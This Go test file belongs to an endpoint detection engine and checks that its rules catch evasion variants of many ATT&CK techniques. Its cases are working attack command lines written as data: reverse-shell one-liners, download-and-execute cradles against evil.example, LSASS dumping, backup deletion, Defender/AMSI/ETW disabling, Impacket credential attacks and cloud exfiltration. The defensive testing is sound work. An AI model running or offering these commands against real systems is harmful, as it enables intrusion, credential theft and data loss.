package detection

import (
	"strings"
	"testing"
)

// Evasion-hardening regression suite. Unlike attack_coverage_test.go (which
// checks one representative payload per technique fires), this locks that
// high-value rules survive COMMON evasions attackers use to slip past a naive
// signature — parameter-prefix abuse, alternate LOLBins, and PowerShell WMI/CIM
// variants. Each case is a genuinely-malicious command line that MUST fire the
// stated technique. Cases were added after auditing the rules and finding real
// false-negative gaps (pwsh, -en/-enco… prefixes, wbadmin, WMI shadow deletion,
// certutil -verifyctl/-split), then hardening the rules to close them.

func firesTechnique(f []EvalFinding, technique string) bool {
	for _, x := range f {
		for _, tag := range x.MITRE {
			if strings.EqualFold(tag, "attack."+strings.ToLower(technique)) || strings.EqualFold(tag, technique) {
				return true
			}
		}
	}
	return false
}

func TestEvasionHardening(t *testing.T) {
	cases := []struct {
		name      string
		technique string
		cmd       string
		image     string
	}{
		// ── T1059.001 Encoded PowerShell: PowerShell accepts any unambiguous
		// parameter prefix, so -en / -enco / -encod / -encode / -encoded / … all
		// mean -EncodedCommand. A rule that lists only -enc/-ec/-e misses them.
		{"ps-prefix-en", "T1059.001", `powershell -en SQBFAFgAIAAoAA==`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"ps-prefix-enco", "T1059.001", `powershell -enco SQBFAFgAIAAoAA==`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"ps-prefix-encod", "T1059.001", `powershell -encod SQBFAFgAIAAoAA==`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"ps-prefix-encoded", "T1059.001", `powershell -encoded SQBFAFgAIAAoAA==`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		// pwsh.exe (PowerShell Core) is still PowerShell — "Image contains powershell" misses it.
		{"pwsh-core", "T1059.001", `pwsh -enc SQBFAFgAIAAoAA==`, `C:\Program Files\PowerShell\7\pwsh.exe`},
		// PowerShell.exe also accepts the "/" switch prefix, so /enc … /encodedcommand
		// decode identically — a "-"-only list is evaded with "powershell /enc <b64>".
		{"ps-slash-enc", "T1059.001", `powershell /enc SQBFAFgAIAAoAA==`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"ps-slash-e", "T1059.001", `powershell /e SQBFAFgAIAAoAA==`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"pwsh-slash-encodedcommand", "T1059.001", `pwsh /encodedcommand SQBFAFgAIAAoAA==`, `C:\Program Files\PowerShell\7\pwsh.exe`},

		// ── T1490 Volume Shadow Copy Deletion: attackers rotate between vssadmin,
		// wbadmin, and PowerShell WMI/CIM to delete backups.
		{"shadow-wbadmin", "T1490", `wbadmin delete catalog -quiet`, `C:\Windows\System32\wbadmin.exe`},
		{"shadow-wbadmin-systemstate", "T1490", `wbadmin delete systemstatebackup -keepVersions:0`, `C:\Windows\System32\wbadmin.exe`},
		{"shadow-ps-wmi", "T1490", `powershell -c "Get-WmiObject Win32_ShadowCopy | Remove-WmiObject"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"shadow-ps-cim", "T1490", `powershell -c "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1105 CertUtil download: -verifyctl -split is an alternate download
		// path to -urlcache. certutil (like most Windows built-ins) also accepts
		// the "/" switch prefix, so /urlcache /split decode identically — a
		// "-"-only list is evaded with "certutil /urlcache /split /f <URL>".
		{"certutil-verifyctl", "T1105", `certutil.exe -verifyctl -f -split http://evil.example/p.exe`, `C:\Windows\System32\certutil.exe`},
		{"certutil-slash-urlcache", "T1105", `certutil.exe /urlcache /split /f http://evil.example/p.exe C:\Windows\Temp\p.exe`, `C:\Windows\System32\certutil.exe`},
		// A bare /decode transfers nothing, so it is T1140 (deobfuscate/decode),
		// not T1105 (ingress transfer). It was asserted as T1105 only because the
		// download rule used to match decode options too — the false positive that
		// split the rule in two. The slash-prefix evasion this case exists to guard
		// is unchanged: the local-decode rule lists both "-" and "/" forms.
		{"certutil-slash-decode", "T1140", `certutil /decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\payload.exe`, `C:\Windows\System32\certutil.exe`},

		// ── T1070.001 Windows event-log clearing: wevtutil accepts both the short
		// verb "cl" and the long form "clear-log", so "wevtutil clear-log Security"
		// evades a " cl "-only rule; Remove-EventLog is the PowerShell counterpart.
		{"wevtutil-clearlog-long", "T1070.001", `wevtutil.exe clear-log Security`, `C:\Windows\System32\wevtutil.exe`},
		{"wevtutil-clearlog-system", "T1070.001", `wevtutil clear-log System /r:dc01`, `C:\Windows\System32\wevtutil.exe`},
		{"ps-remove-eventlog", "T1070.001", `powershell -c "Remove-EventLog -LogName Security"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1543.003 Windows service persistence via MODIFICATION: "sc config
		// <svc> binPath= C:\evil.exe" repoints an existing service's binary and
		// evades a rule keyed only on "sc create ... binPath=".
		{"sc-config-binpath", "T1543.003", `sc.exe config AppMgmt binPath= C:\Windows\Temp\evil.exe`, `C:\Windows\System32\sc.exe`},
		{"sc-config-binpath-spaced", "T1543.003", `sc config wuauserv binpath= "C:\ProgramData\evil.exe"`, `C:\Windows\System32\sc.exe`},

		// ── T1053.005 Scheduled-task persistence via MODIFICATION: "schtasks
		// /change /tn <task> /tr <evil>" repoints an existing task's run command
		// and evades a "/create"-only rule; Set-ScheduledTask is the PS variant.
		{"schtasks-change-tr", "T1053.005", `schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Refresh" /tr C:\Windows\Temp\evil.exe`, `C:\Windows\System32\schtasks.exe`},
		{"ps-set-scheduledtask", "T1053.005", `powershell -c "Set-ScheduledTask -TaskName Updater -Action $a"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1003.001 LSASS dump via a RENAMED procdump: "Image contains procdump"
		// is evaded by renaming the binary, but the -ma/-mp full-dump flags against
		// lsass remain on the command line.
		{"procdump-renamed-ma", "T1003.001", `dump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp`, `C:\Windows\Temp\dump64.exe`},
		{"procdump-renamed-mp", "T1003.001", `svc.exe -mp lsass C:\ProgramData\l.dmp`, `C:\ProgramData\svc.exe`},

		// ── T1105 BITSAdmin multi-step download: "bitsadmin /create; /addfile
		// <URL> <local>; /resume" downloads without /transfer, evading a
		// "/transfer"-only rule; the /addfile step carries the URL.
		{"bitsadmin-addfile-http", "T1105", `bitsadmin /addfile job http://evil.example/x.exe C:\Windows\Temp\x.exe`, `C:\Windows\System32\bitsadmin.exe`},

		// ── T1562.001 Defender RTP disable via numeric value: Set-MpPreference
		// -DisableRealtimeMonitoring 1 disables real-time protection with the
		// numeric 1 instead of $true, evading a "true"-only value match.
		{"defender-rtp-numeric", "T1562.001", `powershell -c "Set-MpPreference -DisableRealtimeMonitoring 1"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1003.001 LSASS dump via Microsoft-signed LOLBins that dump by PID
		// (no "lsass" string, no dedicated-tool name): rdrleakdiag /fullmemdmp
		// and tttracer TTD dumps.
		{"lsass-rdrleakdiag", "T1003.001", `rdrleakdiag.exe /p 748 /o C:\Windows\Temp /fullmemdmp /wait 1`, `C:\Windows\System32\rdrleakdiag.exe`},
		{"lsass-tttracer", "T1003.001", `tttracer.exe -dumpFull -attach 748`, `C:\Windows\System32\tttracer.exe`},

		// ── T1562.001 AMSI bypass patching an export other than AmsiScanBuffer:
		// AmsiScanString and AmsiOpenSession are the other patchable AMSI exports.
		{"amsi-scanstring", "T1562.001", `powershell -c "$p = [Ref].Assembly.GetType('...').GetMethod('AmsiScanString')"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"amsi-opensession", "T1562.001", `powershell -c "patch AmsiOpenSession to return E_INVALIDARG"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1071.001 PowerShell download cradle variants that evade a list of
		// only DownloadString/DownloadFile/Invoke-WebRequest: DownloadData (fileless
		// in-memory), Invoke-RestMethod (irm), [Net.WebRequest], and WebClient.OpenRead.
		{"cradle-downloaddata", "T1071.001", `powershell -c "(New-Object Net.WebClient).DownloadData('http://evil.example/x')|iex"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"cradle-invoke-restmethod", "T1071.001", `powershell -c "Invoke-RestMethod http://evil.example/x.ps1 | iex"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"cradle-webrequest", "T1071.001", `powershell -c "[System.Net.WebRequest]::Create('http://evil.example/x').GetResponse()"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"cradle-openread", "T1071.001", `powershell -c "(New-Object Net.WebClient).OpenRead('http://evil.example/x')"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1218.011 Rundll32 LOLBin export abuse and staging-dir DLL loads that
		// evade a rule keyed only on javascript/vbscript/mshtml.
		{"rundll32-url-openurl", "T1218.011", `rundll32.exe url.dll,OpenURL http://evil.example/x.hta`, `C:\Windows\System32\rundll32.exe`},
		{"rundll32-advpack-inf", "T1218.011", `rundll32.exe advpack.dll,LaunchINFSection C:\Users\Public\evil.inf,,1`, `C:\Windows\System32\rundll32.exe`},
		{"rundll32-pcwutl", "T1218.011", `rundll32.exe pcwutl.dll,LaunchApplication C:\Users\Public\evil.exe`, `C:\Windows\System32\rundll32.exe`},
		{"rundll32-staging-dir", "T1218.011", `rundll32.exe C:\Users\Public\evil.dll,DllMain`, `C:\Windows\System32\rundll32.exe`},
		// rundll32 loads and runs a DLL straight off a UNC share — no script
		// keyword, LOLBin export, or local staging dir, so none of the above
		// markers fire; only the "\\" network-path indicator catches it.
		{"rundll32-unc-share", "T1218.011", `rundll32.exe \\10.0.0.5\share\evil.dll,DllMain`, `C:\Windows\System32\rundll32.exe`},

		// ── T1218.010 Regsvr32 registering a dropped DLL from a staging directory,
		// evading a rule keyed only on the scrobj.dll / .sct squiblydoo pattern.
		{"regsvr32-staging-public", "T1218.010", `regsvr32.exe /s C:\Users\Public\evil.dll`, `C:\Windows\System32\regsvr32.exe`},
		{"regsvr32-staging-temp", "T1218.010", `regsvr32 /s /n /u C:\Windows\Temp\evil.dll`, `C:\Windows\System32\regsvr32.exe`},
		{"regsvr32-staging-programdata", "T1218.010", `regsvr32.exe /s C:\ProgramData\evil.dll`, `C:\Windows\System32\regsvr32.exe`},
		// regsvr32 registers a DLL straight off a UNC share with no /i:, no
		// scrobj.dll, and no local staging dir — evades every existing marker.
		{"regsvr32-unc-share", "T1218.010", `regsvr32.exe /s \\10.0.0.5\share\evil.dll`, `C:\Windows\System32\regsvr32.exe`},

		// ── T1218.005 Mshta launching an HTA payload staged in a user-writable
		// directory under an extensionless name (evades both the .hta-literal and
		// http/script-keyword branches); matches only via the \ProgramData\ token.
		{"mshta-staging-programdata", "T1218.005", `mshta.exe C:\ProgramData\Update\payload`, `C:\Windows\System32\mshta.exe`},

		// ── T1003.003 NTDS/hive extraction via scripted diskshadow or esentutl /vss,
		// which evade an ntds.dit-literal rule (the copy is hidden in a .dsh script,
		// or esentutl copies locked hives through a shadow snapshot).
		{"ntds-diskshadow-script", "T1003.003", `diskshadow /s C:\Users\Public\extract.dsh`, `C:\Windows\System32\diskshadow.exe`},
		{"ntds-esentutl-vss", "T1003.003", `esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\SYSTEM`, `C:\Windows\System32\esentutl.exe`},

		// ── T1003.001 LSASS dump: comsvcs by ORDINAL (#24) instead of the
		// "MiniDump" export name; plus tool/PowerShell dumpers.
		{"lsass-comsvcs-ordinal", "T1003.001", `rundll32.exe C:\Windows\System32\comsvcs.dll, #24 672 C:\temp\l.dmp full`, `C:\Windows\System32\rundll32.exe`},
		{"lsass-out-minidump", "T1003.001", `powershell -c "Out-Minidump -Process (Get-Process lsass)"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"lsass-nanodump", "T1003.001", `nanodump.exe --pid 672 -w C:\temp\lsass.dmp`, `C:\tools\nanodump.exe`},

		// ── T1053.005 Scheduled Task: PowerShell Register-ScheduledTask evades an
		// Image-list keyed on schtasks.exe.
		{"schtask-ps-register", "T1053.005", `powershell -c "Register-ScheduledTask -TaskName evil -Action $a -Trigger $t"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1543.003 Service Creation: PowerShell New-Service evades an
		// Image-list keyed on sc.exe.
		{"service-ps-newservice", "T1543.003", `powershell -c "New-Service -Name evil -BinaryPathName C:\Users\Public\e.exe"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1562.001 Defender tampering: the narrow Set-MpPreference/registry
		// rules miss service-stop, exclusions (blinding), other Set-MpPreference
		// disables, and MpCmdRun signature removal.
		{"defender-sc-stop", "T1562.001", `sc stop WinDefend`, `C:\Windows\System32\sc.exe`},
		{"defender-net-stop", "T1562.001", `net stop windefend`, `C:\Windows\System32\net.exe`},
		{"defender-mp-exclusion", "T1562.001", `powershell -c "Add-MpPreference -ExclusionPath C:\Users\Public"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"defender-mp-ioav", "T1562.001", `powershell -c "Set-MpPreference -DisableIOAVProtection $true"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"defender-mpcmdrun", "T1562.001", `"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MpCmdRun.exe" -RemoveDefinitions -All`, `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MpCmdRun.exe`},

		// ── T1547.001 Run key via PowerShell registry cmdlets evades the
		// reg.exe-keyed rule.
		{"runkey-ps-newitemprop", "T1547.001", `powershell -c "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name evil -Value C:\Users\Public\e.exe -PropertyType String"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"runkey-ps-setitemprop", "T1547.001", `powershell -c "Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name evil -Value C:\Users\Public\e.exe"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1546.003 WMI subscription via PowerShell event cmdlets evades a
		// class-name signature.
		{"wmi-register-wmievent", "T1546.003", `powershell -c "Register-WmiEvent -Query 'SELECT * FROM __InstanceModificationEvent' -Action $a"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"wmi-register-cim", "T1546.003", `powershell -c "Register-CimIndicationEvent -Query 'SELECT * FROM Win32_ProcessStartTrace' -Action $a"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1562.001 AMSI bypass INLINE on the process command line (the AMSI
		// rule keys on ScriptBlockText, so an inline -Command bypass is missed).
		{"amsi-inline-bypass", "T1562.001", `powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1562.006 ETW bypass — patching/disabling Event Tracing to blind
		// EDR telemetry (uncovered entirely).
		{"etw-bypass", "T1562.006", `powershell -c "[Reflection.Assembly]::Load($b); [Win32]::EtwEventWrite($h,$d,0,0)"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		// "logman stop" pauses a trace session but "logman delete" removes it
		// outright — a "stop"-only rule is evaded by going straight to delete.
		{"etw-logman-delete", "T1562.006", `logman delete "Circular Kernel Context Logger" -ets`, `C:\Windows\System32\logman.exe`},
		// Syscall-level ETW patch of NtTraceEvent/NtTraceControl bypasses ETW
		// without ever calling the documented Etw* exports the rule keyed on.
		{"etw-nttraceevent-patch", "T1562.006", `powershell -c "$addr = Get-ProcAddress ntdll.dll NtTraceEvent; [Marshal]::Copy($patch, 0, $addr, $patch.Length)"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1197 BITS via PowerShell Start-BitsTransfer evades a bitsadmin.exe
		// Image-keyed rule.
		{"bits-ps-transfer", "T1197", `powershell -c "Start-BitsTransfer -Source http://evil.example/p.exe -Destination C:\Users\Public\p.exe"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1218.005 mshta by LOCAL .hta or about: (no http/vbscript/javascript
		// token) evades an http-only signature.
		{"mshta-local-hta", "T1218.005", `mshta.exe C:\Users\Public\evil.hta`, `C:\Windows\System32\mshta.exe`},
		{"mshta-about", "T1218.005", `mshta.exe about:"<script>new ActiveXObject('WScript.Shell').Run('calc')</script>"`, `C:\Windows\System32\mshta.exe`},

		// ── T1218.011 rundll32 javascript: proxy execution.
		{"rundll32-javascript", "T1218.011", `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell")`, `C:\Windows\System32\rundll32.exe`},

		// ── T1059.004 Linux reverse shells: the bash /dev/tcp rule misses the
		// classic non-bash one-liners (perl/ruby/php/socat/mkfifo/nc -e/awk) that
		// every reverse-shell cheatsheet ships.
		{"revsh-perl", "T1059.004", `perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));exec("/bin/sh -i");'`, `/usr/bin/perl`},
		{"revsh-ruby", "T1059.004", `ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, `/usr/bin/ruby`},
		{"revsh-php", "T1059.004", `php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`, `/usr/bin/php`},
		{"revsh-socat", "T1059.004", `socat TCP:10.0.0.1:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`, `/usr/bin/socat`},
		{"revsh-mkfifo", "T1059.004", `mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f`, `/bin/sh`},
		{"revsh-nc-e", "T1059.004", `nc -e /bin/sh 10.0.0.1 4444`, `/bin/nc`},
		{"revsh-awk", "T1059.004", `awk 'BEGIN{s="/inet/tcp/0/10.0.0.1/4444";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")}}'`, `/usr/bin/awk`},

		// ── T1059.004 download-and-execute cradle (curl|bash, wget|sh) and
		// base64-decode-and-execute — LOLBin-free payload execution.
		{"dl-curl-pipe-bash", "T1059.004", `curl -s http://evil.example/x.sh | bash`, `/usr/bin/curl`},
		{"dl-wget-pipe-sh", "T1059.004", `wget -qO- http://evil.example/x | sh`, `/usr/bin/wget`},
		{"b64-decode-exec", "T1059.004", `echo cGF5bG9hZA== | base64 -d | bash`, `/bin/sh`},

		// ── T1548.003 sudo GTFOBins escapes the rule misses (env/tar/pager/gdb).
		{"sudo-env", "T1548.003", `sudo env /bin/sh`, `/usr/bin/sudo`},
		{"sudo-tar-checkpoint", "T1548.003", `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`, `/usr/bin/sudo`},
		{"sudo-gdb", "T1548.003", `sudo gdb -nx -ex '!/bin/sh' -ex quit`, `/usr/bin/sudo`},

		// ── T1548.001 SUID/capability enumeration — the #1 Linux privesc recon,
		// with no rule at all.
		{"suid-find-enum", "T1548.001", `find / -perm -4000 -type f 2>/dev/null`, `/usr/bin/find`},
		{"suid-find-us", "T1548.001", `find / -perm -u=s -type f 2>/dev/null`, `/usr/bin/find`},
		{"cap-getcap-enum", "T1548.001", `getcap -r / 2>/dev/null`, `/usr/sbin/getcap`},

		// ── T1611 container escape variants the rule misses (runc /proc/self/exe,
		// cgroup release_agent, docker.sock).
		{"escape-proc-self-exe", "T1611", `cp /proc/self/exe /host/exploit && /proc/self/exe`, `/bin/sh`},
		{"escape-release-agent", "T1611", `echo /cmd > /sys/fs/cgroup/rdma/release_agent`, `/bin/sh`},
		{"escape-docker-sock", "T1611", `curl -s --unix-socket /var/run/docker.sock http://x/containers/create -d '{"Image":"alpine","HostConfig":{"Privileged":true}}'`, `/usr/bin/curl`},

		// ── macOS T1574.006 Dylib injection via DYLD_* env vars — completely
		// uncovered.
		{"macos-dyld-insert", "T1574.006", `DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /Applications/Safari.app/Contents/MacOS/Safari`, `/bin/sh`},
		{"macos-dyld-libpath", "T1574.006", `DYLD_LIBRARY_PATH=/tmp/evil /usr/local/bin/tool`, `/bin/sh`},
		// osascript reverse shell (should be caught cross-platform / by AppleScript rule).
		{"macos-osascript-revsh", "T1059.002", `osascript -e 'do shell script "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'`, `/usr/bin/osascript`},

		// ── AD reconnaissance via direct ADSI/LDAP search — attackers enumerate
		// the directory without net.exe/dsquery/PowerView cmdlets by driving
		// [adsisearcher] / System.DirectoryServices.DirectorySearcher straight
		// against LDAP. A rule that only lists the cmdlets/LOLBins misses this.
		{"adsi-user-enum", "T1087.002", `powershell -c "([adsisearcher]'(&(objectCategory=person)(objectClass=user))').FindAll()"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"adsi-user-searcher", "T1087.002", `powershell -c "$s=New-Object System.DirectoryServices.DirectorySearcher; $s.Filter='(samaccounttype=805306368)'; $s.FindAll()"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"adsi-group-enum", "T1069.002", `powershell -c "([adsisearcher]'(objectClass=group)').FindAll()"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"adsi-computer-enum", "T1018", `powershell -c "$s=New-Object System.DirectoryServices.DirectorySearcher('(objectCategory=computer)'); $s.FindAll()"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── Impacket Kerberos / DCSync tooling — the dominant cross-platform
		// (Linux) attacker toolset. Rules built around Rubeus/mimikatz/PowerView
		// miss the Impacket .py equivalents, which need no Windows host at all.
		{"impacket-asreproast", "T1558.004", `python3 GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat -dc-ip 10.0.0.1`, `/usr/bin/python3`},
		{"impacket-kerberoast", "T1558.003", `python3 GetUserSPNs.py corp.local/svc:Passw0rd -request -dc-ip 10.0.0.1`, `/usr/bin/python3`},
		{"impacket-dcsync", "T1003.006", `python3 secretsdump.py -just-dc corp.local/admin:Passw0rd@10.0.0.1`, `/usr/bin/python3`},
		// Impacket remote-exec (lateral) and NTLM relay — keyed on the Windows
		// binary, the .py forms slip past. atexec/dcomexec aren't caught even by
		// substring.
		{"impacket-atexec", "T1021.002", `python3 atexec.py corp.local/admin:Passw0rd@10.0.0.5 "whoami"`, `/usr/bin/python3`},
		{"impacket-dcomexec", "T1021.002", `python3 dcomexec.py -object MMC20 corp.local/admin:Passw0rd@10.0.0.5`, `/usr/bin/python3`},
		{"impacket-ntlmrelay", "T1557.001", `python3 ntlmrelayx.py -t ldaps://dc.corp.local --escalate-user attacker`, `/usr/bin/python3`},
		// evil-winrm interactive WinRM shell — the dominant Linux WinRM attack
		// client, missed by rules keyed on winrs.exe / Enter-PSSession.
		{"evil-winrm-shell", "T1021.006", `evil-winrm -i 10.0.0.5 -u administrator -H 2b576acbe6bcfda7`, `/usr/bin/ruby`},

		// Ransomware-gang cloud exfil: rclone launched via a cmd/powershell wrapper
		// (so Image isn't rclone), and MEGAcmd — both miss a rule keyed only on the
		// rclone image name.
		{"rclone-wrapped", "T1567.002", `cmd.exe /c rclone.exe copy C:\data remote:bucket --transfers 16`, `C:\Windows\System32\cmd.exe`},
		{"megacmd-exfil", "T1567.002", `mega-put -c /loot/loot.zip mega:/exfil`, `C:\Users\Public\mega-put.exe`},

		// ── T1649 Certify.exe — GhostPack's Windows/.NET-native AD CS abuse
		// tool (same authors/family as Rubeus/Seatbelt), missing entirely from
		// a rule keyed only on the Python Certipy tool.
		{"certify-adcs-find", "T1649", `Certify.exe find /vulnerable`, `C:\Users\Public\Certify.exe`},

		// ── T1572 ligolo-ng tunneling — an increasingly common reverse-tunnel
		// proxy/agent pair, entirely missing from the tunneling-tool rule.
		{"ligolo-ng-agent", "T1572", `-connect 10.0.0.1:11601 -ignore-cert`, `C:\Users\Public\ligolo-ng_agent_0.6.2_windows_amd64.exe`},

		// ── T1135 Snaffler share-content crawling — a dominant real-world
		// "find secrets on every reachable share" tool the rule missed.
		{"snaffler-share-crawl", "T1135", `Snaffler.exe -o snaffler.log -s`, `C:\Users\Public\Snaffler.exe`},

		// ── T1082 privilege-escalation enumeration tooling — WinPEAS/Seatbelt/
		// PowerUp/SharpUp/Watson/Sherlock/PrivescCheck had no rule at all
		// before this batch; these are near-universal first steps after
		// landing a foothold.
		{"privesc-winpeas", "T1082", `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.example/winPEAS.ps1')"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"privesc-seatbelt", "T1082", `Seatbelt.exe -group=all`, `C:\Users\Public\Seatbelt.exe`},
		{"privesc-powerup", "T1082", `powershell -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},

		// ── T1021.002 Impacket's pip/pipx console-script entry points, which
		// drop the ".py" suffix the rule was keyed on entirely — "impacket-
		// wmiexec domain/user:pass@host" is now the more common invocation
		// than running wmiexec.py directly from a source checkout.
		{"impacket-wmiexec-consolescript", "T1021.002", `impacket-wmiexec corp.local/administrator:Passw0rd@10.0.0.5`, `/usr/local/bin/impacket-wmiexec`},

		// ── T1087.002 bloodhound-python (the real console-script name of the
		// cross-platform BloodHound collector) invoked with its short "-c"
		// collection-method flag, as shown in virtually every usage example —
		// the rule only matched SharpHound/Invoke-BloodHound or the long-form
		// "--collectionmethods"/"-CollectionMethod" flags.
		{"bloodhound-python-shortflag", "T1087.002", `bloodhound-python -c All -u svc-collector -p Passw0rd -d corp.local -ns 10.0.0.1`, `/usr/local/bin/bloodhound-python`},

		// ── T1518.001 Security software discovery for AV/EDR vendors missing
		// from the products list (only Defender/Sentinel/CrowdStrike/
		// CarbonBlack/Cylance/Cybereason/Sophos/Sysmon were covered).
		{"secsoft-discovery-mcafee", "T1518.001", `powershell -c "Get-Service | Where-Object {$_.DisplayName -like '*McAfee*'}"`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"secsoft-discovery-trendmicro", "T1518.001", `wmic process where "name like '%trendmicro%'" get Name`, `C:\Windows\System32\wbem\wmic.exe`},

		// ── T1550.002 CrackMapExec pass-the-hash using its real console-script
		// name. CrackMapExec's pip-installed entry point is "cme", not the
		// full "crackmapexec" package name the rule was keyed on — the actual
		// "cme smb <targets> -u admin -H <hash>" invocation never matched.
		{"cme-pth-shortform", "T1550.002", `cme smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee`, `/usr/local/bin/cme`},

		// ── T1558.001 renamed-Rubeus silver ticket forging. Golden tickets
		// still get caught via "/krbtgt:" even when Rubeus.exe is renamed,
		// but silver tickets use "/service:" + a target-account hash and have
		// no other rename-resistant signal in the current rule.
		{"rubeus-silver-renamed", "T1558.001", `update.exe silver /service:cifs/dc01.corp.local /rc4:aad3b435b51404eeaad3b435b51404ee /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt`, `C:\Users\Public\update.exe`},

		// ── T1021.002 renamed PsExec — attackers routinely rename both the
		// client binary and, via "-r <name>", the remote service it installs,
		// evading a rule keyed only on psexec.exe/psexesvc.exe. "-accepteula"
		// is a Sysinternals-suite-specific flag that survives the rename.
		{"psexec-renamed-client", "T1021.002", `svchost_update.exe \\10.0.0.5 -accepteula -s -d cmd.exe /c whoami`, `C:\Users\Public\svchost_update.exe`},

		// ── T1218.007 msiexec installing an MSI package straight off a UNC
		// share. The rule's "remote" selector listed an *unquoted* "\\\\" —
		// in plain YAML scalars backslash isn't an escape character, so that
		// parsed to 4 literal backslashes and never matched a real UNC
		// path's 2, silently disabling the UNC half of the rule.
		{"msiexec-unc-share", "T1218.007", `msiexec.exe /i \\10.0.0.5\share\payload.msi /quiet`, `C:\Windows\System32\msiexec.exe`},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ev := map[string]interface{}{
				"type": "process", "image_path": c.image, "process_name": c.image,
				"command_line": c.cmd, "action": "create",
			}
			f := EvaluateEnvelope("process", ev)
			if !firesTechnique(f, c.technique) {
				var got []string
				for _, x := range f {
					got = append(got, x.Title)
				}
				t.Errorf("EVASION MISS: %s (%s) not detected — cmd=%q; fired=%v", c.name, c.technique, c.cmd, got)
			}
		})
	}
}
